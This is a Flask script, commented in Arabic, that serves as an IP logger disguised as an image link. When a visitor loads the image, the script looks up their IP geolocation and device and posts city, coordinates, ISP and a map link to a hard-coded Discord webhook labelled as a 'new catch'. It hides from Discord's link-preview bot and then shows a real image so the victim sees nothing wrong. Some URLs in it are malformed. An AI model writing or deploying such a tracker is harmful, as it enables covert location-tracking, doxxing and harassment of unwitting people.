from flask import Flask, request, send_file
import requests
import io

app = Flask(__name__)

WEBHOOK_URL = "https://discord.com/api/webhooks/1493558963869061224/tY_NAc83SlbAMed-ibT8MdFhC88Owdqb-naTrn6q5-En386EXCCqZBByyhiPg6S7JBOr"
IMAGE_URL = "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRvw7uLGr6ScxbGYJhGNqEjXnW-e6nJaE5c0w&s"

@app.route('/api/image')
def logger():
    user_agent = request.headers.get('User-Agent', '')
    ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0]

    # إذا كان الطلب من ديسكورد (بوت المعاينة)، لا ترسل الصورة الحقيقية
    if "discord" in user_agent.lower():
        return "Not Found", 404

    # جلب معلومات تفصيلية عن الـ IP
    info = requests.get(f"http://ip-api.com{ip}?fields=66842623").json()
    
    # بناء رسالة مفصلة
    embed = {
        "title": "🚨 صيد جديد - معلومات كاملة!",
        "color": 0xFF0000,
        "fields": [
            {"name": "📍 الموقع", "value": f"{info.get('city')}, {info.get('country')}", "inline": True},
            {"name": "🌐 الإحداثيات", "value": f"{info.get('lat')}, {info.get('lon')}", "inline": True},
            {"name": "🏢 الشركة المزودة", "value": info.get('isp'), "inline": False},
            {"name": "📱 الجهاز", "value": user_agent, "inline": False},
            {"name": "🔗 خريطة جوجل", "value": f"[اضغط هنا](https://google.com{info.get('lat')},{info.get('lon')})", "inline": False}
        ],
        "footer": {"text": f"IP: {ip}"}
    }
    
    requests.post(WEBHOOK_URL, json={"embeds": [embed]})

    # إرسال الصورة الأصلية للمتصفح
    response = requests.get(IMAGE_URL)
    return send_file(io.BytesIO(response.content), mimetype='image/png')
